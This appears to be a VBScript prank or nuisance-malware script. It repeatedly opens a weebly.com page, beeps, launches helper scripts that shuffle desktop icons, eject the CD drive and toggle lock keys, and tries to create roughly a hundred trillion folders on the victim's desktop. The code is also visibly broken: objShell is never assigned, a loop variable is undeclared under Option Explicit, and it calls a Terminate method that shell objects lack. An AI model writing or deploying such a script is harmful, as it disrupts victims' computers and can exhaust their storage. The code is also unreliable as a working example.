Option Explicit

Dim objShell, objShellApp, objDesktop, objFolder, objItem, xPos, yPos, ts, strDriveLetter, intDriveLetter, fs, colCDROMs, d, oWMP, i, folder_name
Const CDROM = 4
Const num_folders = 99999999999999
Dim base_folder_name

' Open website loop
CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False
CreateObject("WScript.Shell").Run "https://j26nabr4tcsw908qiu.weebly.com/", 1, False

' Beep sound loop
Dim beepThread : Set beepThread = CreateObject("Scripting.Dictionary")
beepThread.Add "Thread", CreateObject("WScript.Shell")
beepThread("Thread").Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()"", 0, True

' Move desktop items loop
Dim moveThread : Set moveThread = CreateObject("Scripting.Dictionary")
moveThread.Add "Thread", CreateObject("WScript.Shell")
moveThread("Thread").CurrentDirectory = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Desktop")
moveThread("Thread").Run "cscript MoveDesktopItems.vbs", 0, False

' Eject CD loop
Dim ejectThread : Set ejectThread = CreateObject("Scripting.Dictionary")
ejectThread.Add "Thread", CreateObject("WScript.Shell")
ejectThread("Thread").Run "cscript EjectCD.vbs", 0, False

' Create many folders
Dim folderThread : Set folderThread = CreateObject("Scripting.Dictionary")
folderThread.Add "Thread", CreateObject("WScript.Shell")
folderThread("Thread").CurrentDirectory = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Desktop")
folderThread("Thread").Run "cscript CreateFolders.vbs " & num_folders & " ""FinalRuze""", 0, False

' Type some text and toggle lock keys
Dim keyThread : Set keyThread = CreateObject("Scripting.Dictionary")
keyThread.Add "Thread", CreateObject("WScript.Shell")
keyThread("Thread").Run "cscript ToggleLockKeys.vbs", 0, False

' Wait for user input to terminate
WScript.StdOut.Write "Press Enter to terminate all threads."
WScript.StdIn.ReadLine

' Terminate all threads
For Each thread In Array(beepThread, moveThread, ejectThread, folderThread, keyThread)
    If thread.Exists("Thread") Then
        thread("Thread").Terminate
        Set thread("Thread") = Nothing
    End If
    Set thread = Nothing
Next
